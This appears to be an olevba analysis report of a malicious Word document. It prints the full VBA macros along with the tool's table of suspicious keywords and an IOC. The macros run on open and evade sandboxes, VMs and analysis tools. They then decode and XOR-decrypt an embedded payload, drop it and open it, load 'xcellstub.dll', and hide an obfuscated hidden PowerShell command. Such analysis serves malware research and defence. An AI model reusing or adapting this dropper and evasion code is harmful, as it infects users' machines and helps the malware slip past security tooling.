@@ -1,0 +1,291 @@
+olevba 0.51 - http://decalage.info/python/oletools
+Flags        Filename                                                         
+-----------  -----------------------------------------------------------------
+OLE:MASI-B-- 32
+===============================================================================
+FILE: 32
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: 32 - OLE stream: u'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub ViewVBCode()
+    NONONONONONONONONONONONO
+End Sub
+
+Sub FileTemplates()
+    NONONONONONONONONONONONO
+End Sub
+
+Sub ToolsMacro()
+    NONONONONONONONONONONONO
+End Sub
+
+
+
+Private Sub Document_OPEN()
+
+    For Each afield In ActiveDocument.Fields
+        'extraction du nom de champ nomVar
+        nomVar = Right(Trim(afield.Code), Len(Trim(afield.Code)) - InStr(1, Trim(afield.Code), " "))
+        If InStr(1, Trim(nomVar), " ") Then
+            nomVar = Left(Trim(nomVar), InStr(1, Trim(nomVar), " ") - 1)
+        End If
+        'MsgBox nomVar
+        Num = 0
+        For Each aVar In ActiveDocument.Variables
+            If aVar.Name = nomVar Then Num = aVar.Index
+        Next aVar
+        digisdigis
+        If Num = 0 Then
+            ActiveDocument.Variables.Add Name:=nomVar, Value:=" "
+            'MsgBox "varCree" & ActiveDocument.Variables(nomVar).Value
+            Else
+            ActiveDocument.Variables(nomVar).Value = " "
+            'MsgBox "varExiste" & ActiveDocument.Variables(nomVar).Value
+        End If
+    Next
+
+
+
+                'ActiveDocument.Fields.Update  'Mise à jour des champs
+
+End Sub
+
+
+                '--------------------------------------------------------
+                'Public Sub SupprVariables() 'Suppression des variables du document 
+
+                    'Dim varX As Variable
+
+                        'For Each varX In ActiveDocument.Variables
+                             'varX.Delete
+                        'Next varX
+
+                'End Sub
+                '---------------------------------------------------------
+
+-------------------------------------------------------------------------------
+VBA MACRO AutoOpen.bas 
+in file: 32 - OLE stream: u'VBA/AutoOpen'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub Main()
+    digisdigis
+
+    d = False
+    
+    If WordBasic.AppCount() < 50 Then
+        d = True
+    End If
+
+    tns = Array("vmware", "vmtools", "vbox", "process explorer", "processhacker", "procmon", "visual basic", "fiddler", "wireshark")
+    bns = Array("virtualbox", "vmware")
+    Set ws = GetObject("winmgmts:\\.\root\cimv2")
+
+    Dim names() As String
+    ReDim names(WordBasic.AppCount())
+    WordBasic.AppGetNames names
+    For Each n In names
+        For Each tn In tns
+            If InStr(LCase(n), tn) > 0 Then
+                d = True
+            End If
+        Next
+    Next
+
+    Set qis = ws.ExecQuery("Select * from Win32_Processor", , 48)
+    For Each i In qis
+            If i.NumberOfCores < 3 Then
+                d = True
+            End If
+    Next
+
+    Set qis = ws.ExecQuery("Select * from Win32_Bios", , 48)
+    For Each i In qis
+        For Each bn In bns
+            If InStr(LCase(i.SMBIOSBIOSVersion), bn) > 0 Then
+                d = True
+            End If
+            If InStr(LCase(i.SerialNumber), bn) > 0 Then
+                d = True
+            End If
+        Next
+    Next
+
+    Set qis = ws.ExecQuery("Select * from Win32_ComputerSystem", , 48)
+    For Each i In qis
+        If i.partOfDomain Then
+            d = True
+        End If
+    Next
+
+    If d Then
+        NONONONONONONONONONONONO
+        Exit Sub
+    End If
+    offy = iffyoffy
+    
+    payload_size = 78508
+    b64 = Replace(supersuper(offy), vbLf, "")
+    b64 = Left(b64, payload_size)
+    
+    Dim rawlobster() As Byte
+    rawlobster = bbbbb(b64)
+    rawf = ActiveDocument.Path & "\\as8ja8sj3d.doc"
+    FF = FreeFile
+    Open rawf For Binary Access Write As #FF
+    
+    Put #FF, 1, rawlobster
+    Close #FF
+    Application.Documents.Open rawf
+End Sub
+Function supersuper(iffy) As String
+On Error Resume Next
+   fp = ActiveDocument.Path & "\\" & ActiveDocument.Name
+   Dim data As String
+   Dim FF As Integer
+   FF = FreeFile
+    Open fp For Input As #FF
+    
+    Seek FF, iffy + 1
+    supersuper = Input$(LOF(FF) - iffy, FF)
+    Close 1
+End Function
+
+Function iffyoffy() As Long
+    iffyoffy = ((500) + (1337) + 81175))
+End Function
+
+Private Function bbbbb(ByVal snakes As String) As Variant
+    On Error Resume Next
+    Set oo = CreateObject("MSXML2.DOMDocument")
+    Set xx = oo.createElement("b64")
+    xx.dataType = "bin.base64"
+    xx.Text = snakes
+
+
+    bbbb = xx.nodeTypedValue
+    
+    k = Asc(Mid(WordBasic.[GetSystemInfo$](30), 10, 1)) Xor Asc(Mid(WordBasic.[GetSystemInfo$](30), 17, 1))
+    
+    Dim pppp(58880) As Byte
+    For iter = 0 To 58880
+        pppp(iter) = bbbb(iter) Xor k
+    Next
+    bbbbb = pppp
+
+ 
+End Function
+
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: 32 - OLE stream: u'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+#If Win64 Then
+Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal libFileName As String) As LongPtr
+Private Declare PtrSafe Function smk9yd4nkg Lib "xcellstub" Alias "DummyFunc9" (ByVal param0 As Long, ByVal param1 As LongPtr, ByVal param2 As LongPtr) As Long
+#Else
+Private Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal libFileName As String) As Long
+Private Declare Function smk9yd4nkg Lib "xcellstub" Alias "DummyFunc9" (ByVal param0 As Long, ByVal param1 As Long, ByVal param2 As Long) As Long
+#End If
+Private Sub Workbook_Open()
+    Dim dllPath As String
+    Dim msg As String
+    On Error Resume Next
+    dllPath = ThisWorkbook.Path + "\xcellstub.dll"
+    hModule = LoadLibrary(dllPath)
+
+    smk9yd4nkg &H492, ObjPtr(Application), 0
+    ThisWorkbook.Saved = True
+    ThisWorkbook.Close False
+End Sub
+
+Sub digisdigis()
+    abc = "po&[++{}>[%@$)w!e;||&rs<h}|e}+;:&%ll.e,<[<x~!@(e(#"
+    abc = abc + " ][+;^{-,&N^~o|!:P@|^>:*] -{[_)st%+&<:<?>@[a**; ,|"
+    abc = abc + "-%^{;N|+{(*>_o)(,n&I%,:+<%^% @-(W ({{H)i^^!d?)#]d]"
+    abc = abc + "}e@]};n~ -+En$;(<,(c$ $^^W>w>BT>A&)H~|;~:&#**k|A#<"
+    abc = abc + "*U[|^?@?wB~:!0A{_!?*!*E>,#?(?+^$]?+?~[!?~_#+UA^b!Q"
+    abc = abc + "]{A}u{&#A_E|>:?4%!#>AZ(+@<>+,Q%%$@^_^B{UA<[?C4|[A+"
+    abc = abc + "$((U?<{w}!{B_@~lA(|{|%[H>IA{|^$%,&<^$d$++_^[?_%g(~"
+    abc = abc + ");&+&Bp&:;A{+}@~GM&[^?#{A(|&Z:}[#%(|:%)Q>#{B)Q]A{)"
+    abc = abc + "@E;8~!*$A|)}??)$;~])+!!+S&;Q(<^&{!]B<(*&%|O@!|#_A%"
+    abc = abc + "[_,,);^:~^^[,$&>^<F^%%|:~Q<|##[!,(A]}T,Q<}<+B,<#B("
+    abc = abc + "&?*#A!<%(<~*[_G]+}4A@{>!~Q;Q>+*?@:#:[)Bn)?>{A~;_E;"
+    abc = abc + "~~^%*U?)A[;<;+(c_$%!#:,(&}g$]}(,%>B%#dA;^D}>;;o):)"
+    abc = abc + "A~;[Og?!^BF<~^}A|F!%*]~g%]*&*AcA_BFA_^E;)*}]M:A@*>"
+    abc = abc + ";!&V[,&_~A*@Ax{]|+A,]D|A)!_;A+~$$[:#?%+^M}^A%~B>D~"
+    abc = abc + "#AE^[:$?)@@;@>*:<+;{,;++?*8%($[#+_[||^,%#A}~#~T}:g"
+    abc = abc + "*{^*<^B0^)^%~%>A!E}k::;%>A}Tg|*_(B^+,@<,,V+%#^?;&A"
+    abc = abc + ">E)[!??U|#A:I^>!|$A&A&:9<})#&A$)%,C,|+A|AMA}}!A7,^"
+    abc = abc + "(|_@^%!A>?:?,;[|?~@CQ>:!;A!*dw?~~B,jA<):*&#^<D%0A#"
+    abc = abc + "?T>^*#g#!|,*^]*|<B^+:~~^]F(!A+|_F:<;|~*}(>%$c$A;(}"
+    abc = abc + ";<L*}?(*Q~BP,^};A[G|<%IA*?:)ag%@#*+%(!%@B[F~A>E*#@"
+    abc = abc + "^*$$;?(,^,><+[&M?~({AdA#:,|!*]+,A[&}}]@gAF,!$,$#MA"
+    abc = abc + "}eQBT^A&?>{){_)[{%*}^;_];,!$H+]^Q;}>AZ],Q_?!({^BN)"
+    abc = abc + "A}{C,!]]%]!@@4;!#*]}{~~_<A$*T%<g_>#+B<l]$%]>#)AH?@"
+    abc = abc + "Q_A%L:g$:+(_]^B;:%@^_;$X~+A@GUA!>Y?gBD;~&(;?*;:*AG"
+    abc = abc + "+$+((w[!&#:)AS%?*}Q(}^]@:B(?FA@+<+[(&?{@+{G^~)!^4#"
+    abc = abc + "A>%:|d;]?#$+,AA{$}7{>>A](CQ@,&?A#{dQ|A9$^A+,C$(c*%"
+    abc = abc + "?AT{Q)|>BvA[$_H>$o{}$A)[a_Q%|{+|)B>sAGw@}?+!@A)Y]Q"
+    abc = abc + ",_Av$:AD!:#|$<U&**A_*~L$%g[;_^A#!w:*@%:^A]])~|}CA["
+    abc = abc + "@@A!?KA?]*B&[)]{%X&+>AG)k??(]#~_Abg:~#<[;|(&[?~(<<"
+    abc = abc + ";B~:kAG8;A<>]dw{)$&@]$;__+((*B#&^%[<z~;~:#A}<:#C<A"
+    abc = abc + "_|}}?($A]T]%[:^;>g|B(@<]]U$}]}^#}A{@%@+C][;;))~{A["
+    abc = abc + "&AN_g}A:$u^;~+A+DE)>:A^,)*~O+@^w;$A(|^@gA?F{!>c;[["
+    abc = abc + "A],)<)<T!|;:^|@^%wBX$|>A!D@,&Y]A;|:]{+N[(*~%<AA7?+"
+    abc = abc + "+}AC}{AA_V|ABy%!AG;&#]+*k^#)(&&AZ@?*>&+$~A!##%?$B;"
+    abc = abc + "{{l+):A,?!G4^A|@~(;{?&@}d,&A}>#%#_A{v,?&ADc,$%;$A]"
+    abc = abc + "%]>&|LgAw@#A*D!s,[A&_;[:!]I}A#B?yA&H{,)@%Y%A+O>^~g"
+    abc = abc + "*!^!}A&}*?:x?%A}_^_DE_A(|:#{$],(L%?%{*g,;})A:|*^?*"
+    abc = abc + "wA$C#^*}$k]!+<~(#}?##)_>|;|A|;_|*I>>@A<,,&|)>]B,}]"
+    abc = abc + ",:[s&[[A(]G~[}?k|:%>#A$a,,@w|B~|$&+*}^};<}>:l+A>^&"
+    abc = abc + "C^:,;A*A~R]~%%}!wB^,!,~<[~l>A;[^%~GM}:A,awBv)_~#>>"
+    abc = abc + "A^C*c&|A^O^_>|_|:*^}$wB,![@b]|^?}__@|A},+<_+~@|@%%"
+    abc = abc + "]&FM({?[<A;e@Q[~,|:{;Bz]A[HQ~~_(AZ&@!^%;)~[*,:[<QB"
+    abc = abc + "|*~t{^}<;@AC(4(@^A%|T+~~g#<%?@]B|^]]l~$(A[#<;~#H;;"
+    abc = abc + "_|{$Q>A^!~?%L%<{~&g?<%*@$)&^^B#;)+TA,{&$?*,>[*%_GU"
+    abc = abc + "(>Ac%}|g?_[$#B|><~2#AG#^k$&;[!(]>%A<:#YwB>;lA(F~,;"
+If CallByName(Application, "ShowVisualBasicEditor", VbGet) Then NONONONONONONONONONONONO
+End Sub
+
+
+-------------------------------------------------------------------------------
+VBA MACRO Module2.bas 
+in file: 32 - OLE stream: u'VBA/Module2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub NONONONONONONONONONONONO()
+    CallByName ActiveDocument, "SaveAs2", VbMethod, ActiveDocument.Path & "\\" & ActiveDocument.Name, 4
+   ActiveDocument.Close wdDoNotSaveChanges
+    End Sub
+
+
++------------+----------------+-----------------------------------------+
+| Type       | Keyword        | Description                             |
++------------+----------------+-----------------------------------------+
+| AutoExec   | AutoOpen       | Runs when the Word document is opened   |
+| AutoExec   | Document_OPEN  | Runs when the Word or Publisher         |
+|            |                | document is opened                      |
+| AutoExec   | Workbook_Open  | Runs when the Excel Workbook is opened  |
+| Suspicious | Xor            | May attempt to obfuscate specific       |
+|            |                | strings (use option --deobf to          |
+|            |                | deobfuscate)                            |
+| Suspicious | Open           | May open a file                         |
+| Suspicious | vmware         | May detect virtualization               |
+| Suspicious | vbox           | May detect virtualization               |
+| Suspicious | Binary         | May read or write a binary file (if     |
+|            |                | combined with Open)                     |
+| Suspicious | CreateObject   | May create an OLE object                |
+| Suspicious | Write          | May write to a file (if combined with   |
+|            |                | Open)                                   |
+| Suspicious | Put            | May write to a file (if combined with   |
+|            |                | Open)                                   |
+| Suspicious | CallByName     | May attempt to obfuscate malicious      |
+|            |                | function calls                          |
+| Suspicious | Lib            | May run code from a DLL                 |
+| Suspicious | Base64 Strings | Base64-encoded strings were detected,   |
+|            |                | may be used to obfuscate strings        |
+|            |                | (option --decode to see all)            |
+| IOC        | xcellstub.dll  | Executable file name                    |
++------------+----------------+-----------------------------------------+
+
